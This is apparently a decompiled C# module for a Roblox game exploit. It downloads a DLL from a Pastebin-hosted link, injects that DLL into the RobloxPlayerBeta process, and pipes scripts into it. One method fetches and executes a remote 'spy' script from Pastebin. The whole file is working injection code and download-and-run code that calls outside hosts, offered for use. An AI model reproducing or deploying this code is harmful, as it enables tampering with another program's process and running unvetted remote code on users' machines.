using Microsoft.Win32;
using System;
using System.IO;
using System.IO.Pipes;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace ApiModule
{
    // Token: 0x02000002 RID: 2
    public class ApiModule
    {
        // Token: 0x06000001 RID: 1 RVA: 0x000020AC File Offset: 0x000002AC
        public static bool namedPipeExist(string pipeName)
        {
            bool result;
            try
            {
                if (!ApiModule.WaitNamedPipe(Path.GetFullPath(string.Format("\\\\.\\pipe\\{0}", pipeName)), 0))
                {
                    int lastWin32Error = Marshal.GetLastWin32Error();
                    if (lastWin32Error == 0)
                    {
                        result = false;
                        return result;
                    }
                    if (lastWin32Error == 2)
                    {
                        result = false;
                        return result;
                    }
                }
                result = true;
            }
            catch (Exception)
            {
                result = false;
            }
            return result;
        }

        // Token: 0x06000002 RID: 2
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern bool WaitNamedPipe(string name, int timeout);

        // Token: 0x06000003 RID: 3 RVA: 0x00002110 File Offset: 0x00000310
        public static void ExecuteScript(string Script)
        {
            if (!ApiModule.namedPipeExist("462B9C47BB16AF43C5CF0BB7C970349DCEA20D1BFB8AA87E688BAF8E93553B0F"))
            {
                MessageBox.Show("Please attach!", "NamedPipeDoesntExist", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                return;
            }
            using (NamedPipeClientStream namedPipeClientStream = new NamedPipeClientStream(".", "462B9C47BB16AF43C5CF0BB7C970349DCEA20D1BFB8AA87E688BAF8E93553B0F", PipeDirection.Out))
            {
                namedPipeClientStream.Connect();
                using (StreamWriter streamWriter = new StreamWriter(namedPipeClientStream, Encoding.Default, 999999))
                {
                    streamWriter.Write(Script);
                    streamWriter.Dispose();
                }
                namedPipeClientStream.Dispose();
            }
        }

        // Token: 0x06000004 RID: 4 RVA: 0x000021B0 File Offset: 0x000003B0
        public static bool DownloadDLL()
        {
            string[] array = wc.DownloadString("https://pastebin.com/raw/X6VePTFn").Split("\r\n".ToCharArray(), StringSplitOptions.RemoveEmptyEntries);
            wc.DownloadFile(array[1], "ApiModuleDLL.dll");
            return File.Exists("ApiModuleDLL.dll");
        }

        // Token: 0x06000005 RID: 5 RVA: 0x000021FC File Offset: 0x000003FC
        public static bool CheckUpdate()
        {
            string[] array = wc.DownloadString("https://pastebin.com/raw/X6VePTFn").Split("\r\n".ToCharArray(), StringSplitOptions.RemoveEmptyEntries);
            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\\\ApiModule", true);
            if (registryKey == null)
            {
                registryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\\\\ApiModule");
                registryKey.SetValue("Ver", "0");
            }
            if (registryKey.GetValue("Ver").ToString() != array[0])
            {
                registryKey.SetValue("Ver", array[0]);
                return true;
            }
            return false;
        }

        // Token: 0x06000006 RID: 6 RVA: 0x00002050 File Offset: 0x00000250
        public void RunRemoteSpy()
        {
            ExecuteScript(wc.DownloadString("https://pastebin.com/raw/QeVmYCk1"));
        }

        // Token: 0x06000007 RID: 7 RVA: 0x0000228C File Offset: 0x0000048C
        public static void InjectDLL()
        {
            DLLInjection.DllInjectionResult dllInjectionResult = DLLInjection.DllInjector.GetInstance.Inject("RobloxPlayerBeta", Application.StartupPath + "\\ApiModuleDLL.dll");
            if (dllInjectionResult != DLLInjection.DllInjectionResult.Success)
            {
                switch (dllInjectionResult)
                {
                    case DLLInjection.DllInjectionResult.DllNotFound:
                        MessageBox.Show("Couldn't find the dll!", "Error: Dll Not Found", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                        return;
                    case DLLInjection.DllInjectionResult.GameProcessNotFound:
                        MessageBox.Show("No ROBLOX process foud!", "Game Process Not Found", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                        return;
                    case DLLInjection.DllInjectionResult.InjectionFailed:
                        MessageBox.Show("Injection failed!", "Injection Failed", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                        break;
                    default:
                        return;
                }
            }
        }

        // Token: 0x06000008 RID: 8 RVA: 0x0000230C File Offset: 0x0000050C
        public static void LaunchExploit()
        {
            if (ApiModule.namedPipeExist("462B9C47BB16AF43C5CF0BB7C970349DCEA20D1BFB8AA87E688BAF8E93553B0F"))
            {
                MessageBox.Show("Already Attached!", "NamedPipeExist!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                return;
            }
            if (!CheckUpdate() && File.Exists("ApiModuleDLL.dll"))
            {
                InjectDLL();
                return;
            }
            if (DownloadDLL())
            {
                InjectDLL();
                return;
            }
            MessageBox.Show("Cant download the lastest version!", "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Hand);
        }

        // Token: 0x04000001 RID: 1
        public static WebClient wc = new WebClient();
    }
}
